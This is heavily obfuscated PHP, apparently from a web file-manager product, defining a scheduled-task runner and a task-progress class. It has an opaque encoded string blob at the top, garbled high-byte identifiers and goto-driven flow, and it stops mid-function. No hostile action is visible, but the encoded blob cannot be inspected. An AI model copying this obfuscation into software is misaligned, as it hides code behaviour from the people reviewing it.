\x52\xaa\xc5\xdf\xdf\x40\x46\x26\xfc\x58\x18\xad\x4c\xcb\x2a\x15\x7c\xa9\x89\x36\x1b\xa8\x21\x11\xe9"."\163\233\106\47\43\244\277\144\231\242\347\302\221\116\205\147\16\63\273\221\5\115\16\10\50\341\125\45\115\14\133\55\130\375\324\23\26\340\234\54\62\24\210\163\57\142".base64_decode('AqmJ2RLp+NGqzl2CBxMfRQMvC4/PXrKw8PyG/UkXwISJfuVAlH2S7LKECCItWg==').strrev('Ÿÿ¶e0á‘€.Uñ'."\r".'ajr­·í´ìBb¬úÑ9{h°<*Í`Œ¶1ı‡5ü')."\147\373\377\371\46\33\123\344\236\103\230\141\133\37\255\273\341\50\61\227\240\247\303\22\43\21\316\374\303\155\306\45\274\57\206\342\114\145\220\372\171\240\356\37\144\166"."\x6f\x1\x6f\x80\xd8\x79\x0\x3e\x62\x25\x45\xe0\x53\x36\x39\x27\x96\xf4\xc9\x27\x80\xa8\x3d\xec\x85\xa2\x7c\x91\xdc\x57\xf5\x2c\x28\x47\x79\x53\x3e\x80\xb4\x1a\xed\xc9\x73\x43\x6\x1"."\xdf\x68\xf5\xc8\x27\xb0\xa\x39\xc5\x38\x91\x2\x1c\x5\xf5\x79\xe1\xa6\x21\x24\x55\x41\x4e\x93\xd2\x46\xd1\xd0\xcb\x9f\xa1\xd2\x57\x31\x21\xc7\x9d\xb3\x29\x55\x41\xa6\xa0\x84\xb8\x88"."\x4\xc5\x92\x94\x43\x86\x42\x96\xad\xd0\x92\x28\x82\x87\x3f\xf5\xe8\xb2\x3e\x86\x48\x6a\x34\xd9\x1e\xe0\xc1\x85\x2c\xee\x1a\x2d\xc7\xcb\xb9\x17\xa6\xb9\xb5\xd9\x12\x16\xab\x40\xe5\x4a"."\353\51\14\173\241\257\304\376\144\137\251\63\367\143\130\267\31\112\375\1\50\275\273\154\37\144\13\53\357\52\142\117\41\12\42\52\10\211\135\247\253\261\105\327\20\153"."\x65\x4d\x65\x87\xf\x82\x5a\x9a\x40\x13\x73\xde\xad\xb2\x1d\xca\x3\xa9\x48\xb8\xb3\xc2\x1e\x91\xb0\x9b\x4e\xe8\xf0\x5\x90\x40\x29\xd8\xda\x54\x84\x14\xee\x61\x2\xc\x10\xff\x76\x84"."\323\133\52\215\226\204\77\330\11\113\21\314\206\215\54\205\357\243\62\267\166\305\22\167\26\42\372\2\205\147\275\302\253\253\146\52\203\117\301\10\74\260\225\214\345\254"."\xc9\x10\x5d\xe3\x5a\x8d\x69\x4\xed\x54\x6b\x6\x54\x27\xb6\xae\xa7\x59\xf9\x8a\x45\x35\xdd\x10\x8a\xb1\xf4\x7c\x65\xe1\xab\x63\xa6\x65\xa2\xb8\x83\x54\xbb\x63\x54\x24\x5c\x63\x79\xd9"."\x22\x36\x93\xbb\x47\x31\x49\xb8\x9a\x3\x9c\x70\xcc\xaa\xf7\x88\x32\x51\x32\xf5\xb8\x44\x1f\xdf\xe5\xd7\x49\xd6\xbb\x3d\xe6\x99\x32\x87\x9e\x65\xd5\x46\x21\x1b\xd5\xa2\xfe\x3a\xc0\x2f"."\264\31\362\161\163\150\224\215\17\301\75\175\262\111\157\310\354\265\132\55\142\207\160\23\30\105\150\351\315\275\336\341\267\116\2\347\100\253\101\271\205\123\144\133\272\260"."\171\160\232\50\367\361\33\35\316\50\307\142\354\171\110\113\121\366\120\73\113\5\51\374\45\111\310\50\11\146\210\134\337\125\351\267\277\155\346\22\115\27\55\5\163\123".base64_decode('uZmifVxoLVh8gbpE+0aGLTwJO75liiOCtAEVsrlGCe4jk7L5J63WlKwYmwxQBg==')."\xa9\xbf\x3b\x2d\xa9\x36\xf9\x9\x9e\x59\xd0\x4d\xd4\x96\x65\x88\x4f\x5a\x5a\xef\xea\x44\xb1\x5f\x98\x5b\x25\xd9\x28\x34\x27\xde\xe3\x1d\xb4\x42\x30\xff\x47\x38\xba\x59\x41\x2c\x58\x9e".base64_decode('8gy6V4mtWAgkGxgpGRAzLd2xTy0SBjhe4sQUOth00TPh3PKKrfdiBfvIcA09Bw==')."\x3e\xa4\x4e\xfe\x4f\xdb\x3f\x40\xc1\x63\x17\xb8\x78\x23\x82\xa8\x93\x73\xcb\x1f\xd2\xf2\xd4\xc1\x3d\xca\x5b\xd\x67\xa1\x37\x92\x19\x33\x66\xa9\x6b\xf4\xab\x66\x34\x91\xb7\x2e\xce\x82"."\x75\x73\xb2\x69\x65\xe1\xa4\x42\xa8\x67\xca\x59\xe3\x20\xc3\xcb\x5\x1e\x11\xda\x63\x79\x6\x6c\x13\x6d\x71\xd1\x83\xc1\x33\x6f\xe1\xdc\xcf\x11\xe4\xb1\x97\x46\x52\x7e\xfe\x5e\x70\xe1"."\xdc\x76\x77\x9a\xaf\x17\x79\xb\x1f\xb4\x17\x79\x1e\x86\x25\xee\xa5\xf2\xd0\x43\x9a\x93\x87\x2\xf2\x8b\xf6\x5c\x5a\xcb\xf3\xf2\x5c\xfb\xe3\x36\xe1\x3e\x2a\xfa\x35\xc9\x93\x2d\xea\x10"."\344\327\62\10\344\135\305\206\365\372\337\226\56\2\206\353\22\21\355\242\236\64\65\231\0\325\271\206\24\124\200\144\117\213\262\366\160\64\107\333\224\342\136\72\53\150"."\66\346\125\127\165\240\347\244\163\104\315\244\114\17\300\5\115\137\54\140\150\246\32\25\64\216\354\17\144\343\174\372\221\44\77\60\373\142\363\171\273\37\276\143\367\372"."\x9b\x77\x5f\x76\xfe\xce\xcb\xaf\x71\xec\xba\x78\xdd\xae\xb5\x17\x71\x77\xba\x28\x63\xd7\xd\xe7\xec\xb9\xf6\xb2\x19\xd2\xae\x8b\xce\x82\x99\x6b\x2e\xd8\xf1\x97\xcd\xf8\xdf\x9d\xb7\x3d"."\364\305\372\307\240\47\136\124\144\347\206\207\276\330\260\156\367\225\167\356\272\160\313\256\253\157\332\165\325\205\324\231\217\345\270\47\367\150\10\45\341\240\213\237\105\133"."\xf4\xa9\xf1\x8e\x4e\x4e\xe4\xf1\xc5\x59\x2d\xbc\x5d\x65\x97\x31\x50\xac\x72\xe0\x8d\x12\x67\xc3\xe7\xbf\x1d\x30\x2f\xa4\x65\xd0\x6f\x8d\x66\x9a\x94\xee\x0\x56\x17\x95\x44\x6c\x1b\xdc".base64_decode('7RyCsgII8ZsXOCXoMgAhLyIyKEiu8KAIGlRwLiJNlgi8ZGCRQO5tQn02mTxIAg==')."\x10\x1e\x23\xda\x0\x75\x2e\x6\x6d\x34\x79\x7f\xf8\xf3\xa6\xb2\x9d\x35\xe3\x2a\x3\x4\x79\x45\xd5\xb\x64\x9\x6b\xb8\x71\x8e\x9b\x78\x6c\x75\xa2\x36\x9c\xc4\xf9\x47\x77\xa6\xcb\x52"."\x1d\xfb\xb1\x67\x2a\x80\xbf\xd4\x2\x39\x98\xe4\x4d\x60\x2f\x8e\xe8\x94\x9\xfa\x34\xf5\xb6\xfb\x82\xa1\x60\x4e\x56\x8b\x27\x18\x6c\xf3\x7\xea\xb0\xd3\xc7\x9c\x6c\x54\x4b\xd0\x72\xc9"."\xc9\x6a\x69\xf0\x37\x1f\x2c\xcf\xdb\xe4\xf1\x35\xe6\xe4\x41\xad\x97\xe6\x30\xf7\x47\x83\xb3\x7c\x2d\xa8\x97\x9e\xc6\x46\x7f\xdb\xc1\x7a\xe1\xab\x9d\xc7\x7b\x82\xee\x4a\xf9\xc9\x77\x26"."\xa1\xd1\x63\x6c\x7a\x41\x10\x94\x93\x4\xa7\x44\xf3\x2e\x25\xc5\x1d\x13\xf1\x3a\xd6\xa3\x1\x71\x5e\xd\xea\xa1\x8b\x5\xac\xee\xd1\x6d\xa\x68\x14\x61\x49\x43\x50\x63\xa5\x99\xb4\x1d".base64_decode('yJBU6ASTUQrG/qIB2dXeVGEd4Jthl+UGWUhHCwfRLgEhxX0ZJUzMCz3xpjf3YA==')."\37\345\162\350\300\136\317\245\57\44\165\153\21\341\324\20\113\46\304\346\212\300\133\120\131\302\141\222\375\177\0\244\42\26\200\300\232\0\0".base64_decode('').""."".""."".""."", 10, -8))); goto dåˆÄ’Á¯Û; cŸÇ»ğŒÓ: class AutoTask { public static function start() { goto D—Úˆ¸Õ³¼; b…Í±¨Ñ÷Ì: while (!0) { self::cacheClear(); if (self::valueGet($cÏ“ß®ÍÃ[708]) != $cÏ“ß®ÍÃ[86]) { self::valueSet($cÏ“ß®ÍÃ[1465], $cÏ“ß®ÍÃ[486]); self::log($cÏ“ß®ÍÃ[1469]); die; } self::valueSet($cÏ“ß®ÍÃ[1465], $cÏ“ß®ÍÃ[86]); self::valueSet($cÏ“ß®ÍÃ[1466], time()); self::taskRunAll(); sleep(self::valueGet($cÏ“ß®ÍÃ[1470])); } goto aÈŸœ†Ÿˆ; D—Úˆ¸Õ³¼: $cÏ“ß®ÍÃ =& $_SERVER[Æ¼ôºÙï]; if (self::valueGet($cÏ“ß®ÍÃ[708]) != $cÏ“ß®ÍÃ[86]) { return; } if (self::valueGet($cÏ“ß®ÍÃ[1465]) == $cÏ“ß®ÍÃ[86]) { $Cæ°ÎØöåå = self::valueGet($cÏ“ß®ÍÃ[1466]); if (time() - $Cæ°ÎØöåå > 3600 * 2) { self::restart(); } return; } goto E„§© ŸŒ”; E„§© ŸŒ”: http_close(); self::valueSet($cÏ“ß®ÍÃ[1465], $cÏ“ß®ÍÃ[86]); Hook::bind($cÏ“ß®ÍÃ[1467], $cÏ“ß®ÍÃ[1468]); goto b…Í±¨Ñ÷Ì; aÈŸœ†Ÿˆ: } public static function restart() { $c¢Ğ¼³¿¥‹ =& $_SERVER[Æ¼ôºÙï]; http_close(); self::valueSet($c¢Ğ¼³¿¥‹[708], $c¢Ğ¼³¿¥‹[486]); sleep(self::valueGet($c¢Ğ¼³¿¥‹[1470]) + 5); self::valueSet($c¢Ğ¼³¿¥‹[1465], $c¢Ğ¼³¿¥‹[486]); self::valueSet($c¢Ğ¼³¿¥‹[708], $c¢Ğ¼³¿¥‹[86]); } public static function shutdownEvent() { $A¹ßİİ‰íÃ =& $_SERVER[Æ¼ôºÙï]; self::valueSet($A¹ßİİ‰íÃ[1465], $A¹ßİİ‰íÃ[486]); self::log($A¹ßİİ‰íÃ[1471]); } public static function config($b’Ÿ›¿¼µ, $b£Äº”Øí) { $e´¦¢¥õñ† =& $_SERVER[Æ¼ôºÙï]; $eŒŒ¶–²ª = 10; $b£Äº”Øí = intval($b£Äº”Øí) <= $eŒŒ¶–²ª ? $eŒŒ¶–²ª : intval($b£Äº”Øí); self::valueSet($e´¦¢¥õñ†[708], $b’Ÿ›¿¼µ); self::valueSet($e´¦¢¥õñ†[1470], $b£Äº”Øí); } private static function taskRunAll() { goto Eóà¥§“Ò«; f¦³¿•Œ¨: self::taskQueueRun($EÕ«Š˜ğİ); self::closeDatabase(); goto C¤—©‚ßÓ; D”™ñ¸ßÒÛ: $C–áÊ¸¹Á = count($eÒ¢Ú‰ëÄ); for ($fçé®Õº¢ = 0; $fçé®Õº¢ < $C–áÊ¸¹Á; $fçé®Õº¢++) { $EÔÛ°´Õƒà = $eÒ¢Ú‰ëÄ[$fçé®Õº¢]; if (!$EÔÛ°´Õƒà[$D¾´ªå÷¹œ[385]] || $EÔÛ°´Õƒà[$D¾´ªå÷¹œ[1473]] != $D¾´ªå÷¹œ[86]) { continue; } if (!self::taskTimeCheck($EÔÛ°´Õƒà)) { continue; } self::taskRun($EÔÛ°´Õƒà); } Hook::trigger($D¾´ªå÷¹œ[1474]); goto f¦³¿•Œ¨; Eóà¥§“Ò«: $D¾´ªå÷¹œ =& $_SERVER[Æ¼ôºÙï]; $EÕ«Š˜ğİ = timeFloat(); $eÒ¢Ú‰ëÄ = Model($D¾´ªå÷¹œ[1472])->listData(); goto D”™ñ¸ßÒÛ; C¤—©‚ßÓ: } private static function taskQueueRun($CŒîìÖª®Ó) { $A„Üá„–ªÊ = 10; while (!0) { $e…Õñ˜˜¢æ = TaskQueue::run(); if ($e…Õñ˜˜¢æ === !1) { break; } if (timeFloat() - $CŒîìÖª®Ó >= $A„Üá„–ªÊ) { break; } } } private static function taskTimeCheck($Då´ÔÂ¼å­) { goto EËÓÁ«®ê–; EËÓÁ«®ê–: $bğÊÚ¥¸…‹ =& $_SERVER[Æ¼ôºÙï]; $bº¿”ÙÛ¡ƒ = json_decode($Då´ÔÂ¼å­[$bğÊÚ¥¸…‹[195]], !0); $BåÕÅÄòÊ’ = intval($Då´ÔÂ¼å­[$bğÊÚ¥¸…‹[1466]]); goto Eñµ–æÅñâ; b›†ò”‚Âğ: switch ($bº¿”ÙÛ¡ƒ[$bğÊÚ¥¸…‹[29]]) { case $bğÊÚ¥¸…‹[1481]: if (time() - $BåÕÅÄòÊ’ < 3600 * 24 * 30) { return !1; } if ($bº¿”ÙÛ¡ƒ[$bğÊÚ¥¸…‹[1481]] == date($bğÊÚ¥¸…‹[1482]) && $D£­ËÖ½‹„) { return !0; } break; case $bğÊÚ¥¸…‹[1483]: if (time() - $BåÕÅÄòÊ’ < 3600 * 24 * 7) { return !1; } $Aµ±Ÿ¿£è = date($bğÊÚ¥¸…‹[1484]) == 0 ? 7 : date($bğÊÚ¥¸…‹[1484]); if ($bº¿”ÙÛ¡ƒ[$bğÊÚ¥¸…‹[1483]] == $Aµ±Ÿ¿£è && $D£­ËÖ½‹„) { return !0; } break; case $bğÊÚ¥¸…‹[1476]: if (time() - $BåÕÅÄòÊ’ < 3600 * 24) { return !1; } if ($D£­ËÖ½‹„) { return !0; } break; case $bğÊÚ¥¸…‹[1485]: if (time() - $BåÕÅÄòÊ’ >= floatval($bº¿”ÙÛ¡ƒ[$bğÊÚ¥¸…‹[1485]]) * 60) { return !0; } break; default: break; } return !1; goto f¥——ÒÌ; Eñµ–æÅñâ: $bÃÈã¥™ôš = strtotime($bğÊÚ¥¸…‹[1475] . $bº¿”ÙÛ¡ƒ[$bğÊÚ¥¸…‹[1476]] . $bğÊÚ¥¸…‹[1477]) - strtotime($bğÊÚ¥¸…‹[1478]); $Aõùä÷à­” = time() - strtotime(date($bğÊÚ¥¸…‹[1479]) . $bğÊÚ¥¸…‹[1480]); $D£­ËÖ½‹„ = $Aõùä÷à­” >= $bÃÈã¥™ôš && $Aõùä÷à­” <= $bÃÈã¥™ôš + 3600; goto b›†ò”‚Âğ; f¥——ÒÌ: } private static function closeDatabase() { goto b³èÉ‡·•¾; fŠñ³î‡³: $BÛö“‰ªÕö = Model($FìåËœø‡Í[492])->db($FìåËœø‡Í[33]); if ($BÛö“‰ªÕö) { $BÛö“‰ªÕö->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($FìåËœø‡Í[1486], $FìåËœø‡Í[1487]); die; } goto E§°Á”ÕÌ; b³èÉ‡·•¾: $FìåËœø‡Í =& $_SERVER[Æ¼ôºÙï]; static $b‹Áå£ïÆ = 0; $DÛó¨¢ãù¦ = 1800; goto a§ÇŸğÏÌ; a§ÇŸğÏÌ: if (!$b‹Áå£ïÆ) { $b‹Áå£ïÆ = time(); } if (time() - $b‹Áå£ïÆ < $DÛó¨¢ãù¦) { return; } $b‹Áå£ïÆ = time(); goto fŠñ³î‡³; E§°Á”ÕÌ: } public static function taskRun($F÷šé§„ ”) { goto CôÙâ“ŒÖ¦; CôÙâ“ŒÖ¦: $fø¶ìí´œ¤ =& $_SERVER[Æ¼ôºÙï]; self::log($fø¶ìí´œ¤[1488] . $F÷šé§„ ”[$fø¶ìí´œ¤[385]] . $fø¶ìí´œ¤[1489] . $F÷šé§„ ”[$fø¶ìí´œ¤[28]] . $fø¶ìí´œ¤[1490] . $F÷šé§„ ”[$fø¶ìí´œ¤[1491]]); Model($fø¶ìí´œ¤[1472])->run($F÷šé§„ ”[$fø¶ìí´œ¤[385]]); goto dÖ¯µˆ²ƒå; dÖ¯µˆ²ƒå: $F¾Ë‚ í—¦ = timeFloat(); $FÀÏÑñ›Ğ¢ = $fø¶ìí´œ¤[33]; switch ($F÷šé§„ ”[$fø¶ìí´œ¤[29]]) { case $fø¶ìí´œ¤[303]: $A†ô¹÷ø„Ğ = url_request($F÷šé§„ ”[$fø¶ìí´œ¤[1491]], $fø¶ìí´œ¤[226], !1, !1, !1, !1, 5); $FÀÏÑñ›Ğ¢ = strlen($A†ô¹÷ø„Ğ); break; case $fø¶ìí´œ¤[225]: $FÀÏÑñ›Ğ¢ = Hook::apply($F÷šé§„ ”[$fø¶ìí´œ¤[1491]]); default: break; } goto f„î“­óÊ’; f„î“­óÊ’: Model($fø¶ìí´œ¤[1492])->add(array($fø¶ìí´œ¤[1493] => $fø¶ìí´œ¤[33], $fø¶ìí´œ¤[1494] => $fø¶ìí´œ¤[486], $fø¶ìí´œ¤[29] => $fø¶ìí´œ¤[1495] . $F÷šé§„ ”[$fø¶ìí´œ¤[385]], $fø¶ìí´œ¤[1496] => json_encode(array($fø¶ìí´œ¤[28] => $F÷šé§„ ”[$fø¶ìí´œ¤[28]], $fø¶ìí´œ¤[1497] => timeFloat() - $F¾Ë‚ í—¦, $fø¶ìí´œ¤[289] => $FÀÏÑñ›Ğ¢)))); self::log($fø¶ìí´œ¤[1498] . $F÷šé§„ ”[$fø¶ìí´œ¤[385]] . $fø¶ìí´œ¤[1499] . $FÀÏÑñ›Ğ¢); return !0; goto bÂ÷µåÉñê; bÂ÷µåÉñê: } private static function valueGet($f¿ïÈ¤ó“´) { $B·Ô¾ƒï” =& $_SERVER[Æ¼ôºÙï]; $BŠ·” öó = $B·Ô¾ƒï”[1500]; $d‚ïÖµˆ¿ = Model($B·Ô¾ƒï”[1501])->get($f¿ïÈ¤ó“´, $BŠ·” öó); if (is_null($d‚ïÖµˆ¿)) { Model($B·Ô¾ƒï”[1501])->set($B·Ô¾ƒï”[1470], 10, $BŠ·” öó); Model($B·Ô¾ƒï”[1501])->set($B·Ô¾ƒï”[708], $B·Ô¾ƒï”[86], $BŠ·” öó); Model($B·Ô¾ƒï”[1501])->set($B·Ô¾ƒï”[1465], $B·Ô¾ƒï”[486], $BŠ·” öó); $d‚ïÖµˆ¿ = Model($B·Ô¾ƒï”[1501])->get($f¿ïÈ¤ó“´, $BŠ·” öó); } return $d‚ïÖµˆ¿; } private static function valueSet($f°”Üù¾ŒÀ, $e¥¦İ—‰˜) { $b»¹“Á‚ó =& $_SERVER[Æ¼ôºÙï]; return Model($b»¹“Á‚ó[1501])->set($f°”Üù¾ŒÀ, $e¥¦İ—‰˜, $b»¹“Á‚ó[1500]); } protected static function log($E©ê¤é³£ñ) { write_log($E©ê¤é³£ñ, $_SERVER[Æ¼ôºÙï][1487]); } private static function cacheClear() { $B´å¥šƒå =& $_SERVER[Æ¼ôºÙï]; $D™Œ ¤à¾ê = Model($B´å¥šƒå[1501])->cacheKey($B´å¥šƒå[1500]); Cache::clearMemory($D™Œ ¤à¾ê); Model($B´å¥šƒå[1472])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\147"; const STATYS_KILL = "\153\151\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($a£ÜÓƒÈØ, $A®­âÁ›„¼ = '', $d®ò°Û‹ø´ = 0, $D­”²Íˆ§¶ = '') { goto DÚ¿’Ùëç˜; F»œ‚†Œ´‰: $GLOBALS[$FÃĞ‹†½å­[1510]] = 1; Hook::bind($FÃĞ‹†½å­[1467], array($this, $FÃĞ‹†½å­[1511])); Hook::bind($FÃĞ‹†½å­[1512], array($this, $FÃĞ‹†½å­[1513])); goto c»õ…´µİç; DÚ¿’Ùëç˜: $FÃĞ‹†½å­ =& $_SERVER[Æ¼ôºÙï]; if (self::get($a£ÜÓƒÈØ)) { return; } $this->task = array($FÃĞ‹†½å­[385] => $a£ÜÓƒÈØ, $FÃĞ‹†½å­[1502] => USER_ID, $FÃĞ‹†½å­[1407] => $D­”²Íˆ§¶, $FÃĞ‹†½å­[29] => $A®­âÁ›„¼, $FÃĞ‹†½å­[1002] => $FÃĞ‹†½å­[33], $FÃĞ‹†½å­[1000] => $d®ò°Û‹ø´, $FÃĞ‹†½å­[1014] => 0, $FÃĞ‹†½å­[1503] => 0, $FÃĞ‹†½å­[1504] => 0, $FÃĞ‹†½å­[1505] => timeFloat(), $FÃĞ‹†½å­[1506] => 0, $FÃĞ‹†½å­[1507] => 0, $FÃĞ‹†½å­[1508] => 0, $FÃĞ‹†½å­[1509] => 0, $FÃĞ‹†½å­[708] => $FÃĞ‹†½å­[1465]); goto F»œ‚†Œ´‰; c»õ…´µİç: $this->startAfter(); Hook::trigger($FÃĞ‹†½å­[1514], $this->task); $this->task[$FÃĞ‹†½å­[1507]] = timeFloat(); goto a¦æ°³¹ë; a¦æ°³¹ë: } public function end() { goto bšË¸Ì‹ª; bšË¸Ì‹ª: $D¸¾†±¦ßì =& $_SERVER[Æ¼ôºÙï]; if (!$this->task) { return; } if ($this->task[$D¸¾†±¦ßì[1507]]) { self::valueSet($this->task[$D¸¾†±¦ßì[385]], !1); } goto dÏŠäŠœÃÍ; dÏŠäŠœÃÍ: $bèÆá¤Ó‘õ = timeFloat() - $this->task[$D¸¾†±¦ßì[1505]]; self::log($D¸¾†±¦ßì[1515] . $this->task[$D¸¾†±¦ßì[385]] . $D¸¾†±¦ßì[1516] . $bèÆá¤Ó‘õ . $D¸¾†±¦ßì[1517]); Hook::unbind($D¸¾†±¦ßì[1467], array($this, $D¸¾†±¦ßì[1511])); goto eŞ–Ü¿Ç‰; eŞ–Ü¿Ç‰: Hook::unbind($D¸¾†±¦ßì[1512], array($this, $D¸¾†±¦ßì[1513])); $this->endAfter(); $this->task = !1; goto FôŠˆÂ”Î¸; FôŠˆÂ”Î¸: } public function update($bæ·¶¢•Ş = 0, $AÁµİÁùŞ = false) { goto Bñ†ŠÒä ‘; Bƒ“…âÇß«: Hook::trigger($dß´•®¢µõ[1521], $e†Éˆ‹İø‡); self::valueSet($e†Éˆ‹İø‡[$dß´•®¢µõ[385]], $e†Éˆ‹İø‡); goto e­°‚íøÀ; bòÓ¤´ùòç: $e†Éˆ‹İø‡[$dß´•®¢µõ[1014]] += $bæ·¶¢•Ş; $e†Éˆ‹İø‡[$dß´•®¢µõ[1506]] = timeFloat(); if ($e†Éˆ‹İø‡[$dß´•®¢µõ[1000]]) { if ($e†Éˆ‹İø‡[$dß´•®¢µõ[1000]] < $e†Éˆ‹İø‡[$dß´•®¢µõ[1014]]) { $e†Éˆ‹İø‡[$dß´•®¢µõ[1000]] = $e†Éˆ‹İø‡[$dß´•®¢µõ[1014]]; } $fâÚ¡Ï£Ò = timeFloat() - $e†Éˆ‹İø‡[$dß´•®¢µõ[1505]] - $e†Éˆ‹İø‡[$dß´•®¢µõ[1508]]; $e†Éˆ‹İø‡[$dß´•®¢µõ[1503]] = $e†Éˆ‹İø‡[$dß´•®¢µõ[1014]] / $e†Éˆ‹İø‡[$dß´•®¢µõ[1000]]; $e†Éˆ‹İø‡[$dß´•®¢µõ[1504]] = $e†Éˆ‹İø‡[$dß´•®¢µõ[1014]] / $fâÚ¡Ï£Ò; if ($e†Éˆ‹İø‡[$dß´•®¢µõ[1503]] > 0) { $e†Éˆ‹İø‡[$dß´•®¢µõ[1509]] = $fâÚ¡Ï£Ò * (1 - $e†Éˆ‹İø‡[$dß´•®¢µõ[1503]]) / $e†Éˆ‹İø‡[$dß´•®¢µõ[1503]]; } $e†Éˆ‹İø‡[$dß´•®¢µõ[1509]] = $e†Éˆ‹İø‡[$dß´•®¢µõ[1509]] <= 0 ? 0 : $e†Éˆ‹İø‡[$dß´•®¢µõ[1509]]; } goto EÏáŒîÙ¹‹; EÏáŒîÙ¹‹: $this->updateAfter(); $fÈ™áŒ‘æ¥ = 0.2; if (timeFloat() - $e†Éˆ‹İø‡[$dß´•®¢µõ[1507]] < $fÈ™áŒ‘æ¥ && !$AÁµİÁùŞ) { return; } goto DÜÖ–É‘Áè; DÜÖ–É‘Áè: $d“¤¼·ø“” = self::get($e†Éˆ‹İø‡[$dß´•®¢µõ[385]]); $DŠ·—óİàº = $d“¤¼·ø“”[$dß´•®¢µõ[708]]; if ($DŠ·—óİàº == self::STATYS_KILL) { $e±»ìšÒƒ = array($dß´•®¢µõ[1518] => LNG($dß´•®¢µõ[1519]), $dß´•®¢µõ[1065] => !1); Cache::set($dß´•®¢µõ[1520] . $this->task[$dß´•®¢µõ[385]], $e±»ìšÒƒ, 30); $this->end(); die; } else { if ($DŠ·—óİàº == self::STATYS_STOP) { $f¯Úº¥œ°¶ = 2; $d“¤¼·ø“”[$dß´•®¢µõ[1508]] += $f¯Úº¥œ°¶; self::valueSet($e†Éˆ‹İø‡[$dß´•®¢µõ[385]], $d“¤¼·ø“”); sleep($f¯Úº¥œ°¶); $this->update(); return; } } goto aÃÂ¯¬õòÖ; aÃÂ¯¬õòÖ: $e†Éˆ‹İø‡[$dß´•®¢µõ[708]] = $DŠ·—óİàº ? $DŠ·—óİàº : $e†Éˆ‹İø‡[$dß´•®¢µõ[708]]; $e†Éˆ‹İø‡[$dß´•®¢µõ[1508]] = $d“¤¼·ø“”[$dß´•®¢µõ[1508]] ? $d“¤¼·ø“”[$dß´•®¢µõ[1508]] : 0; $e†Éˆ‹İø‡[$dß´•®¢µõ[1507]] = timeFloat(); goto Bƒ“…âÇß«; Bñ†ŠÒä ‘: $dß´•®¢µõ =& $_SERVER[Æ¼ôºÙï]; $e†Éˆ‹İø‡ =& $this->task; if (!$e†Éˆ‹İø‡) { return; } goto bòÓ¤´ùòç; e­°‚íøÀ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($F½õï·˜‰Ú) { $Fì²‚ÃÍ÷ =& $_SERVER[Æ¼ôºÙï]; Cache::set($Fì²‚ÃÍ÷[1520] . $this->task[$Fì²‚ÃÍ÷[385]], $F½õï·˜‰Ú, 60); return $F½õï·˜‰Ú; } public static function get($E­öî–‘°) { return self::valueGet($E­öî–‘°); } public static function listData() { $b¬è¶²ñŸé = self::valueGet(); return array_sort_by($b¬è¶²ñŸé, $_SERVER[Æ¼ôºÙï][1505], !0); } public static function kill($Döøëæãßà) { return self::changeStatus($Döøëæãßà, self::STATYS_KILL); } public static function stop($DÛàãïÚáÒ) { return self::changeStatus($DÛàãïÚáÒ, self::STATYS_STOP); } public static function restart($EŒƒœ„´†¦) { return self::changeStatus($EŒƒœ„´†¦, self::STATYS_RUNNING); } public static function killAll() { $DÃœİ¸Úéõ =& $_SERVER[Æ¼ôºÙï]; $DœÙ¾•„™Á = self::listData(); foreach ($DœÙ¾•„™Á as $BÎà¿ç¶Ÿ½) { self::kill($BÎà¿ç¶Ÿ½[$DÃœİ¸Úéõ[385]]); } sleep(2); foreach ($DœÙ¾•„™Á as $BÎà¿ç¶Ÿ½) { self::valueSet($BÎà¿ç¶Ÿ½[$DÃœİ¸Úéõ[385]], !1); } } private static function changeStatus($Eç­ÄÀ, $eíŒ´š“½·) { goto böŸ¨¨¯Ù; böŸ¨¨¯Ù: $C³ù—ä½‰İ =& $_SERVER[Æ¼ôºÙï]; $dµ½ŠŠ‹æğ = self::valueGet($Eç­ÄÀ); if (!$dµ½ŠŠ‹æğ) { return !1; } goto FË¼õ•å…—; FË¼õ•å…—: $dµ½ŠŠ‹æğ[$C³ù—ä½‰İ[708]] = $eíŒ´š“½·; self::valueSet($Eç­ÄÀ, $dµ½ŠŠ‹æğ); self::log($C³ù—ä½‰İ[1522] . $dµ½ŠŠ‹æğ[$C³ù—ä½‰İ[385]] . $C³ù—ä½‰İ[1523] . $eíŒ´š“½·); goto b¾‰ÌÙšå£; b¾‰ÌÙšå£: return !0; goto cØ™š†Û™â; cØ™š†Û™â: } public static function valueGet($fĞ¬±¼§éª = false) { $BøîÁ‰õÉ =& $_SERVER[Æ¼ôºÙï]; if ($fĞ¬±¼§éª) { $dÃá“ÌÎŒÅ = Model($BøîÁ‰õÉ[416])->where(array($BøîÁ‰õÉ[92] => $fĞ¬±¼§éª, $BøîÁ‰õÉ[29] => $BøîÁ‰õÉ[1524]))->find(); return $dÃá“ÌÎŒÅ ? json_decode($dÃá“ÌÎŒÅ[$BøîÁ‰õÉ[368]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($D¯¶âêÉù = false) { goto cÅŒÍÓĞĞ; cÕâë‹Ô³½: return $cÊÊäÖº×³; goto DòŒŞ‚š©; Aë½™·‰: $cÊÊäÖº×³ = Model($F÷¢Ä†ãìÖ[416])->where($bŠî¸©ñ¤Å)->select(); $cÊÊäÖº×³ = $cÊÊäÖº×³ ? $cÊÊäÖº×³ : array(); foreach ($cÊÊäÖº×³ as $e¿››Šõ¨ => $B¡†µÒ‡†·) { $cÊÊäÖº×³[$e¿››Šõ¨] = json_decode($B¡†µÒ‡†·[$F÷¢Ä†ãìÖ[368]], !0); } goto cÕâë‹Ô³½; cÅŒÍÓĞĞ: $F÷¢Ä†ãìÖ =& $_SERVER[Æ¼ôºÙï]; $bŠî¸©ñ¤Å = array($F÷¢Ä†ãìÖ[29] => $F÷¢Ä†ãìÖ[1524]); if ($D¯¶âêÉù) { $bŠî¸©ñ¤Å[$F÷¢Ä†ãìÖ[1502]] = $D¯¶âêÉù; } goto Aë½™·‰; DòŒŞ‚š©: } public static function valueSet($fĞ‚¶Œ’ÑÔ, $a‘ÕÙá™¥–) { goto F·Û¶ò³¿Æ; f‘å¢Ëô£Î: Model($FÊ¡ÈÊëÄ¯[416])->add($cØÕŠƒÍ„õ, array(), !0); goto b‡î–ÅàÈ•; F·Û¶ò³¿Æ: $FÊ¡ÈÊëÄ¯ =& $_SERVER[Æ¼ôºÙï]; if (!$a‘ÕÙá™¥–) { return 